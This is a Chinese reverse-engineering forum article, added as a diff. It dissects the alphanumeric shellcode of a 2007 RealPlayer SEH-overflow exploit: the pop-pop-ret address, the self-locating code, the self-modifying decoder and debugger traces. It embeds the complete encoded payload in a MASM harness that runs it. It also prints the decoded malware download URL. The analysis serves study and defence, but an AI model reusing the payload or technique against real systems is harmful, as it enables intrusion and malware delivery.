@@ -1,0 +1,387 @@
+
+# 【原创+整理】经典案例中的纯字符 shellcode 调试 07 年 Realplayer 漏洞 Exploit
+
+> 原文：[`www.pediy.com/kssd/pediy11/113227.html`](https://www.pediy.com/kssd/pediy11/113227.html)
+
+看到 `snowdbg` 刚刚的一篇精华文章[`bbs.pediy.com/showthread.php?t=113177`](http://bbs.pediy.com/showthread.php?t=113177)谈到了纯字符型 shellcode 的加解密问题，其中 `achillis` 道出了关键：
+
+引用: *最初由 **achillis**发布* ![查看帖子](img/showthread.php?p=808798#post808798) 似乎是老外写过一个这样的引擎，灰常强大~~普通的 shellcode 经过编码都可以变成纯字母数字的，这个过程不难，关键是解码部分写成纯字母的需要很强的功力~~
+
+于是我想起了 07 年的 Realplayer 漏洞的纯字符 shellcode，这正是用那样的引擎产生出来的，一个连解码部分都是纯字母数字的 shellcode。那时我对 shellcode 调试还并不了解，刚刚尝试接触这个方面的知识就第一次碰到了纯字符 shellcode，因此印象深刻。当时我只能通过查找 `alpha2` 的解密代码，用解密代码来把 shellcode 解出来，而不是通过调试 shellcode 中的解密代码的方式。后来看到了有关漏洞原理和触发的全过程的分析文章，才通过调试 shellcode 中的解密代码的方式把它解密出来，个人觉得那个解密代码的确写得非常有心思。现在恰逢其会，就整一篇小文在这里说一下跟大家分享。
+
+该漏洞的原理请参考
+
+\[1\][`bbs.pediy.com/showthread.php?t=55357`](http://bbs.pediy.com/showthread.php?t=55357)
+
+该漏洞的触发过程及如何跳入 shellcode 的过程，参考
+
+\[2\][`www.sinoit.org.cn/NewsLetter/NO.11/1104.html`](http://www.sinoit.org.cn/NewsLetter/NO.11/1104.html)
+
+从以上两篇文章可以看到，该漏洞的利用是通过触发栈溢出并覆盖 SEH 处理例程地址来实现的，其中以下段落指出的编写 Exploit 的关键：
+
+引用: WideCharToMultiByte 使 Exploit 编写难度加大了，因为不得不使用纯字符的 Shellcode，这样经过 AscII->Unicode->Ascii 转换后的 Shellcode 依然能正确运行。另外，覆盖 SEH 链的地址也必须复合 Unicode 的编码规则。很幸运，`0x60093179` 处的 `pop pop ret` 正好符合我们的要求，我们可以将堆栈覆盖成 `NNNNNN[jmp06 jmp04][0x60093179][Shellcode]` 这样的形式，执行 `pop pop ret` 指令后，EIP 顺利跳入 Shellcode。`0x60093179` 这个地址随版本的不同地址也有所变化，笔者调试的是 6.0.14.544 的英文版 Real player，剩下就是纯字母数字 Shellcode 的问题了。
+
+即编写这个填充数据的难度主要集中在以下三点：
+
+1. 使用纯字符 shellcode 的原因：IE 浏览器将超长的数据传递给 Realplayer 时，对数据进行了 ASCII->UNICODE 转换，而漏洞相关函数中对字符串又进行了 UNICODE->ASCII 转换，为了保证包含有要覆盖的 SEH 地址和 shellcode 的超长输入数据在 ASCII->UNICODE->ASCII 转换后还能正确运行，不但必须使用纯字符型 shellcode，而且连覆盖的 SEH 处理例程地址有了更严格的限制。
+
+2. 当覆盖的 SEH 处理例程地址有更严格的限制的情况下，必须考虑怎么选择这个地址位置以方便跳入 shellcode 了，并充分利用 SEH 处理例程环境的特殊性为后续处理提供便利。这里找到的地址 `0x60093179` 不但刚好满足 ASCII->UNICODE->ASCII 转换后不变的条件，而且该处的代码形如：
+
+`pop e?x`
+
+`pop e?x`
+
+`ret`
+
+下面的调试过程中将看到，选择这样的代码作为 SEH 处理例程内容的好处，是因为根据 SEH 处理例程的格式，ret 后的 EIP 指针将是相应的 `EXCEPTION_REGISTRATION` 结构的头部，也即原来应该保存上一个 `EXCEPTION_REGISTRATION` 结构指针的位置，因此 Exploit 将此处的 4 字节代码指定为 `jmp06 jmp04` 的话，经过这四字节代码之后正好跳入下面的 shellcode。
+
+3. 接下来就是 shellcode 的编写问题，开头纯字符代码，必须要完成代码重定位并对自身后面的加密内容进行解密。下面的调试过程中将看到，由于 shellcode 所处的环境特殊，它是由 SEH 处理例程跳进来的，因此可以通过比较特殊的方法进行重定位，而且在纯字母数字的限制下解码引擎使用 SMC 等精妙的手法完成了“带着镣铐跳舞”的任务。
+
+为了更实际地模拟这个漏洞溢出跳入 SEH 后的执行过程，我写了一段代码人为地构建这样的环境并触发进入 SEH（我自己就不需要考虑把 SEH 地址也搞成纯字符了）。注意文章\[2\]里面有一个地方有点问题，在紧接着 shellcode 后面应该填入一个 `"A"` 才正确，因为下面的分析可以看到在解码引擎中 `"A"` 是作为加密 shellcode 数据的结束标志的。
+
+我的代码源文件内容如下：
+
+代码:
+
+```
+.386 
+.model flat,stdcall 
+option casemap:none
+
+.data
+payload dd 04740675h, 41414141h
+ db 'LLLL\\XXXXXLD'
+ db 'TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIxkR0q'
+ db 'JPJP3YY0fNYwLEQk0p47zpfKRKJJKVe9xJKYoIoYolOoCQv3VsVwLuRKwRvavbFQvJMWVsZzMFv0'
+ db 'z8K8mwVPnxmmn8mDUBzJMEBsHuN3ULUhmfxW6peMMZM7XPrf5NkDpP107zMpYE5MMzMj44LqxGON'
+ db 'uKpTRrNWOVYM5mqqrwSMTnoeoty08JMnKJMgPw2pey5MgMWQuMwrunOgp8mpn8m7PrZBEleoWng2'
+ db 'DRELgZMU6REoUJMmLHmz1KUOPCXHmLvflsRWOLNvVrFPfcVyumpRKp4dpJ9VQMJUlxmmnTL2GWOL'
+ db 'NQKe6pfQvXeMpPuVPwP9v0XzFr3Ol9vRpzFDxm5NjqVxmLzdLSvTumI5alJMqqrauWJUWrhS3OQW'
+ db 'RU5QrENVcE61vPUOVtvTv4uP0DvLYfQOjZMoJP6eeMIvQmF5fLYP1nrQEmvyZkSnFtSooFWTtTpp'
+ db '5oinTWLgOzmMTk8PUoVNENnW0J9mInyWQS3TRGFVt6iEUTgtBwrtTs3r5r5PfEqTCuBgEGoDUtR4'
+ db 'CfkvB4OEDc3UUGbVib4Wo5we6VQVouXdcENeStEpfTc7nVoUBdrfnvts3c77r3VwZwyGw7rdj4OS'
+ db '4DTww6tuOUw2F4StTUZvkFiwxQvtsud7Z6BviR1gxUZ4IVgTBfRWygPfouZtCwWqvRHptd4RPFZV'
+ db 'OdoRWQgrWTnQw2Y3JT96NPod2pgToPgrY0z2YTnSUQhU5k0wpA',0
+
+.code
+Start:
+ push esi
+ push edi
+ push ebx
+ sub esp, 400h
+ call reloc
+reloc: 
+ pop ebx
+ mov esi, offset payload
+ mov edi, esi
+ xor eax, eax
+ or ecx, 0FFFFFFFFh
+ xor eax, eax
+ repne scasb
+ not ecx
+ dec ecx
+ mov edi, esp
+ rep movsb
+ assume fs:nothing
+ mov fs:[0], esp
+ add ebx, sehhandle-reloc
+ mov [esp+4], ebx
+ xor eax, eax
+ mov dword ptr [eax], 0
+ pop ebx
+sehhandle:
+ pop edi
+ pop esi
+ ret 
+
+end Start
+```
+
+可以看到，我的代码人为模拟这个过程，自行将 shellcode 全内容写入堆栈，并指定相应的 SEH 处理例程，然后人为触发写 0 地址的异常从而进入 SEH 处理例程。编译后的 exe 在附件。
+
+用 OD 载入附件中的 `shellcode.exe`，忽略所有异常：
+
+```
+00401000 >/$ 56 push esi
+00401001 |. 57 push edi
+00401002 |. 53 push ebx
+00401003 |. 81EC 00040000 sub esp, 400
+00401009 |. E8 00000000 call 0040100E
+0040100E |$ 5B pop ebx
+0040100F |. BE 00204000 mov esi, 00402000
+00401014 |. 8BFE mov edi, esi
+00401016 |. 33C0 xor eax, eax
+00401018 |. 83C9 FF or ecx, FFFFFFFF
+0040101B |. 33C0 xor eax, eax
+0040101D |. F2:AE repne scas byte ptr es:[edi]
+0040101F |. F7D1 not ecx
+00401021 |. 49 dec ecx
+00401022 |. 8BFC mov edi, esp
+00401024 |. F3:A4 rep movs byte ptr es:[edi], byte ptr>
+00401026 |. 64:8925 00000>mov dword ptr fs:[0], esp
+0040102D |. 81C3 32000000 add ebx, 32
+00401033 |. 895C24 04 mov dword ptr [esp+4], ebx
+00401037 |. 33C0 xor eax, eax
+00401039 |. C700 00000000 mov dword ptr [eax], 0
+0040103F |. 5B pop ebx
+00401040 |. 5F pop edi ; SEH 处理例程地址
+00401041 |. 5E pop esi
+00401042 \. C3 retn
+```
+
+## 1. 如何从 SEH 处理例程进入 shellcode
+
+在 `00401040` 处按一下 F4，断下了，看堆栈中的情况（注意，从这里开始，这个堆栈中的内容以及下面整个 shellcode 的位置在不同的执行环境下有可能不同，重复时以实际的数值为准）：
+
+```
+0013F7E8 7C9232A8 返回到 ntdll.7C9232A8
+0013F7EC 0013F8D0
+0013F7F0 0013FBB8
+0013F7F4 0013F8EC
+0013F7F8 0013F8A4
+```
+
+根据 SEH 处理例程的调用规范，其四个输入参数为：
+
+`pExcept:DWORD,pErr:DWORD,pContext:DWORD,pDispatch`
+
+其中前面几个参数意义为
+
+`pExcept:` --- `EXCEPTION_RECORD` 结构的指针
+
+`pErr:` --- `EXCEPTION_REGISTRATION` 结构的指针
+
+`pContext:` --- `CONTEXT` 结构的指针
+
+`pDispatch`
+
+这里可以看到，当步过两个 pop，ret 代码执行之前，堆栈处保存的指针是 `0013FBB8`，这正是相应 `EXCEPTION_REGISTRATION` 结构的指针，也正是整个有效内容的头部：
+
+```
+0013FBB8 75 06 74 04 40 10 40 00 4C 4C 4C 4C 5C 58 58 58 ut@@.LLLL\\XXX
+0013FBC8 58 58 4C 44 54 59 49 49 49 49 49 49 49 49 49 49 XXLDTYIIIIIIIIII
+0013FBD8 49 49 49 49 49 49 37 51 5A 6A 41 58 50 30 41 30 IIIIII7QZjAXP0A0
+0013FBE8 41 6B 41 41 51 32 41 42 32 42 42 30 42 42 41 42 AkAAQ2AB2BB0BBAB
+```
+
+`ret` 之后，跳进去这段代码：
+
+```
+0013FBB8 /75 06 jnz short 0013FBC0
+0013FBBA |74 04 je short 0013FBC0
+0013FBBC |40 inc eax
+0013FBBD |1040 00 adc byte ptr [eax], al
+0013FBC0 \\4C dec esp ; 单步一次或两次到这里
+```
+
+前面两个判断跳转就是绕过了 SEH 处理例程那 4 字节内容，跳到了下面的 shellcode 开头，至此上面说的第 2 点要求的实现过程已经看清了。
+
+注：正是 SEH 处理例程中可直接访问相应 `EXCEPTION_REGISTRATION` 结构的这个特性给 `EXCEPTION_REGISTRATION` 结构带来了可扩展性，也即只要在原有结构的基础上在后面附上额外的数据，则自定义的 SEH 处理例程可以方便地访问这些数据得到额外的信息。因此，这里后面的整个 shellcode 内容就可以看作是扩展后的 `EXCEPTION_REGISTRATION` 结构的附带数据，而这里 Exploit 利用了一个畸型的扩展的 `EXCEPTION_REGISTRATION` 结构达到了进入 shellcode 的目的。
+
+## 2. 如何进行自定位并满足解码引擎的要求进入解码引擎前的前置代码
+
+进入了 shellcode 之后，首先面临的就是自定位问题。一般的重定位可以采用 `call` 和 `pop` 的方式，而这里由于 shellcode 代码纯字符的限制不能使用，那么应该怎么做呢？
+
+同样由于这里 shellcode 所在的环境比较特殊，它是由 SEH 例程 `ret` 进来的，因此 `ret` 时的那个地址，也就是前面说的相应 `EXCEPTION_REGISTRATION` 结构的指针现在正位于`[esp-4]`处，于是通过以下代码：
+
+```
+0013FBC0 4C dec esp
+0013FBC1 4C dec esp
+0013FBC2 4C dec esp
+0013FBC3 4C dec esp
+0013FBC4 5C pop esp
+```
+
+重新得到了 `0013FBB8` 这个地址到 `esp` 中。但是，前面这部分代码本身也占据空间，为了下面的代码能够对齐（这是指定的解码引擎的要求），又再度使用了单字节的 `pop` 代码（实际效果是每 `pop` 一次 `esp` 加 4）和 `esp` 的递增递减代码达到自洽：
+
+```
+0013FBC5 58 pop eax
+0013FBC6 58 pop eax
+0013FBC7 58 pop eax
+0013FBC8 58 pop eax
+0013FBC9 58 pop eax
+0013FBCA 4C dec esp
+0013FBCB 44 inc esp
+```
+
+
+
+### 自洽
+
+`0013FBCC`    `54`              `push`    `esp`                              ; 该指令执行前 `esp`=0013FBCC，即该指令本身的位置
+
+`0013FBCD`    `59`              `pop`     `ecx`
+
+所谓的“自洽”，其结果就是当代码运行到 `0013FBCC` 时（该处指令还未执行），`esp` 恰好也为 `0013FBCC`，即该指令本身的位置，这是进入指定的解码引擎所必须的要求。
+
+因此，从 `0013FBC0` 到 `0013FBCB` 的这部分代码，在文章[2]的 `exploit` 脚本中为 `AdjESP` 变量，就是为了满足指定的解码引擎的要求进行自定位而进行的修改 `esp` 的操作。解码引擎要求进入其中时 `esp` 指向其代码头部，也就是说自定位的工作必须交给前面这些内容来辅助实现。这就是我前面花这么大篇幅描述的原因，对于 `Exploit` 编写者来说这两部分是最需要费心的地方，因为毕竟后面的解码引擎已经有写好的范本而且可以反复重用。
+
+## 3. 纯字符 shellcode 的关键所在精妙的解码引擎
+
+从 `0013FBCC` 开始的代码就是纯字符 shellcode 的解码引擎了，开头是这样的：
+
+```
+0013FBCC    54              push    esp                              ; 该指令执行前 esp=0013FBCC，即该指令本身的位置
+0013FBCD    59              pop     ecx
+0013FBCE    49              dec     ecx
+0013FBCF    49              dec     ecx
+0013FBD0    49              dec     ecx
+0013FBD1    49              dec     ecx
+0013FBD2    49              dec     ecx
+0013FBD3    49              dec     ecx
+0013FBD4    49              dec     ecx
+0013FBD5    49              dec     ecx
+0013FBD6    49              dec     ecx
+0013FBD7    49              dec     ecx
+0013FBD8    49              dec     ecx
+0013FBD9    49              dec     ecx
+0013FBDA    49              dec     ecx
+0013FBDB    49              dec     ecx
+0013FBDC    49              dec     ecx
+0013FBDD    49              dec     ecx
+0013FBDE    37              aaa
+0013FBDF    51              push    ecx
+0013FBE0    5A              pop     edx
+0013FBE1    6A 41           push    41
+0013FBE3    58              pop     eax
+0013FBE4    50              push    eax
+0013FBE5    3041 30         xor     byte ptr [ecx+30], al
+0013FBE8    41              inc     ecx
+0013FBE9    6B41 41 51      imul    eax, dword ptr [ecx+41], 51
+```
+
+首先显然 `ecx` 是（和后来的 `edx`）取代了 `esp` 成为自定位代码位置的关键。那么前面拼命的 `dec ecx` 是干嘛呢？其实这又是一个“自洽”，是为了后面的 `xor` 和 `imul` 等解码中的 `30h`、`41h` 等数目能够刚刚好满足纯字符限制（`30h` 的 ASCII 码即表示'0'，`41h` 的 ASCII 码即表示'A'）。
+
+### 3.1 解码代码的恢复(1)利用 xor 进行解码引擎内部的第一次 SMC
+
+代码第一个重要的实现，就是那个 `xor`：
+
+```
+0013FBDF    51              push    ecx                              ; ecx=0013FBBC
+0013FBE0    5A              pop     edx
+0013FBE1    6A 41           push    41
+0013FBE3    58              pop     eax
+0013FBE4    50              push    eax
+0013FBE5    3041 30         xor     byte ptr [ecx+30], al            ; xor byte ptr [0013FBEC], 41h
+0013FBE8    41              inc     ecx
+0013FBE9    6B41 41 51      imul    eax, dword ptr [ecx+41], 51
+```
+
+这跑到 `xor` 指令（尚未执行）时看到的代码状态，我是不是该说一句“接下来就是见证奇迹的时刻”？单步一下，好吧其实上面的注释我已经透露了，`xor` 一下变成这样：
+
+```
+0013FBDF    51              push    ecx                              ; ecx=0013FBBC
+0013FBE0    5A              pop     edx
+0013FBE1    6A 41           push    41
+0013FBE3    58              pop     eax
+0013FBE4    50              push    eax
+0013FBE5    3041 30         xor     byte ptr [ecx+30], al            ; xor byte ptr [0013FBEC], 41h
+0013FBE8    41              inc     ecx
+0013FBE9    6B41 41 10      imul    eax, dword ptr [ecx+41], 10      ; 解码引擎的第一次 SMC，还原该指令
+```
+
+下面一句 `imul` 代码中的 `51h` 已然变成 `10h`。
+
+这里可以看到，由于解码引擎本身必须纯字母数字的限制，原本的 `10h` 这个字节不能直接存在，因此解码引擎采用了这样一种 `xor` 的方式在运行时进行 SMC 还原自身。
+
+### 3.2 解码代码的恢复(2)利用解码引擎自身进行第二次 SMC
+
+接下来解码引擎看起来已经开始了，单步到 `0013FBF3`（未执行），此时的代码情况：
+
+```
+0013FBE8    41              inc     ecx
+0013FBE9    6B41 41 10      imul    eax, dword ptr [ecx+41], 10      ; imul eax, dword ptr [0013FBFE], 10h
+0013FBED    3241 42         xor     al, byte ptr [ecx+42]            ; xor al, byte ptr [0013FBFF]
+0013FBF0    3242 42         xor     al, byte ptr [edx+42]            ; xor al, byte ptr [0013FBFE]
+0013FBF3    3042 42         xor     byte ptr [edx+42], al            ; xor byte ptr [0013FBFE], al
+0013FBF6    41              inc     ecx
+0013FBF7    42              inc     edx
+0013FBF8    58              pop     eax
+0013FBF9    50              push    eax
+0013FBFA    3841 42         cmp     byte ptr [ecx+42], al
+0013FBFD    75 4A           jnz     short 0013FC49
+```
+
+好了，又是一个“见证奇迹的时刻”，单步过了这个 `xor` 指令，代码变成这样：
+
+```
+0013FBE8    41              inc     ecx
+0013FBE9    6B41 41 10      imul    eax, dword ptr [ecx+41], 10      ; imul eax, dword ptr [0013FBFE], 10h
+0013FBED    3241 42         xor     al, byte ptr [ecx+42]            ; xor al, byte ptr [0013FBFF]
+0013FBF0    3242 42         xor     al, byte ptr [edx+42]            ; xor al, byte ptr [0013FBFE]
+0013FBF3    3042 42         xor     byte ptr [edx+42], al            ; xor byte ptr [0013FBFE], al
+0013FBF6    41              inc     ecx
+0013FBF7    42              inc     edx
+0013FBF8    58              pop     eax
+0013FBF9    50              push    eax
+0013FBFA    3841 42         cmp     byte ptr [ecx+42], al
+0013FBFD  ^ 75 E9           jnz     short 0013FBE8                   ; 解码引擎的第二次 SMC，还原往回跳的指令
+```
+
+可以看到，第一次的解码实际上解的不是后面的原始 shellcode 代码，而洽洽是解码引擎的最后一个字节，即把这个形成循环的往回跳的 `jnz` 指令的中的代表偏移的字节给还原了。这也是因为 `E9h` 这个字节不符合纯字符的要求而做的改变。
+
+综上，通过巧妙地构建解码引擎，可以在编排时代码符合纯字符的前提下，在运行时将自身的解码代码通过精心设计的 SMC 还原出来，从而正常实现解码功能。
+
+正如 `achillis` 所说，解码引擎这一部分是如此优美和谐以及自洽，体现了引擎编写者深厚的功力。
+
+### 3.3 原始 shellcode 数据的解码
+
+走过一次上面的代码，到 `0013FBFD` 处跳回去后，以后的循环就是
+
+```
+0013FBE8    41              inc     ecx
+0013FBE9    6B41 41 10      imul    eax, dword ptr [ecx+41], 10
+0013FBED    3241 42         xor     al, byte ptr [ecx+42]
+0013FBF0    3242 42         xor     al, byte ptr [edx+42]
+0013FBF3    3042 42         xor     byte ptr [edx+42], al
+0013FBF6    41              inc     ecx
+0013FBF7    42              inc     edx
+0013FBF8    58              pop     eax                              ; 此指令执行后总有 eax=41h 即'A'
+0013FBF9    50              push    eax
+0013FBFA    3841 42         cmp     byte ptr [ecx+42], al            ; 以'A'为结束符
+0013FBFD  ^ 75 E9           jnz     short 0013FBE8
+```
+
+分析这个解码算法，其实就是两个字节的密文得到一个字节的原文。解码引擎中 `ecx` 是用来指向密文地址，而 `edx` 是用来指向原文地址。其中的这两句
+
+```
+0013FBF0    3242 42         xor     al, byte ptr [edx+42]
+0013FBF3    3042 42         xor     byte ptr [edx+42], al
+```
+
+其实起的效果就是 `mov byte ptr [edx+42], al`，这又是因为 `mov` 指令不合纯字符的问题而采用两个 `xor` 指令代替。
+
+具体的算法，比如两个字节密文的 16 进制表示如果是 `0xKL` 和 `0xMN`（这里的 K~N 为代数）而原文是 `0xXY`，那么则有 `X=L^M`，`Y=N`。应该说对于纯字母数字的 ASCII 码，`K` 和 `L` 是限制因子，而这个解码引擎可以看到 `K` 为多少是完全不影响解码的，而纯字母数字的 `L` 和 `N` 是可以覆盖 `00h` 到 `0Fh` 的范围的，而 `L^M` 同样可以覆盖这个范围，所以通过两个字节的密文是可以模拟 `00h` 到 `0FFh` 的所有原文的。
+
+另外从这个算法，可以看到密文结尾必须加一个 `'A'` 做结束标志从而结束循环，直接到 `0013FBFF` 处执行解密后的代码。至于密文中为何不会有 `'A'`，可以回头看文章[2]中的生成代码：
+
+引用: `char* valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";`
+
+可以看到（原文该行中的空格应该是排版的错误，不应该有空格）这个密文包含的字符列表中，`'A'` 已经被刻意抽掉了作为结束符用。当然这个 `41h` 实际上也是解码引擎第一次 SMC 时 `xor` 指令的 key。
+
+综上，只要在 `0013FBFF` 按一下 F4，即得到解码完毕进入 shellcode 开头：
+
+```
+0013FBFF   /EB 10           jmp     short 0013FC11
+0013FC01   |5A              pop     edx
+0013FC02   |4A              dec     edx
+0013FC03   |33C9            xor     ecx, ecx
+0013FC05   |66:B9 3C01      mov     cx, 13C
+0013FC09   |80340A 66       xor     byte ptr [edx+ecx], 66
+0013FC0D  ^|E2 FA           loopd   short 0013FC09
+0013FC0F   |EB 05           jmp     short 0013FC16
+0013FC11   \\E8 EBFFFFFF    call    0013FC01
+```
+
+到了这里，纯字符 shellcode 的解码引擎的工作完成了，控制权交给了原始 shellcode（这里指不再是纯字符的普通 shellcode 层面）。当然这里原始 shellcode 又加了一个简单的 `xor`，在 `0013FC16` 处按一下 F4 就解出来了，具体的就不再涉及，病毒 URL 地址在下面：
+
+```
+0013FD52  68 74 74 70 3A 2F 2F 77 77 77 2E 67 79 7A 79 2E  http://www.gyzy.
+0013FD62  6F 72 67 2F 67 79 7A 79 2E 65 78 65 80 00        org/gyzy.exe.
+```
+
+总结：本文分析了 07 年的 Realplayer 漏洞中示例 `Exploit` 从 `SEH` 处理例程一直到纯字符 shellcode 解码引擎执行的过程，简要分析了在纯字符条件限制下的 `SEH` 处理例程中进入 shellcode 的方法、解码引擎前面进行特殊情况下的自定位的前置代码，以及重点分析了由纯字母数字组成的解码引擎代码的精妙处理过程和解码步骤，希望能够借此揭示纯字符 shellcode 编写技巧的冰山一角。
+
+上传的附件
+
+| ![](img/0623e01110d741fd20f66acbc8ec6f9d.jpg) || RealplayerShellcode.rar |
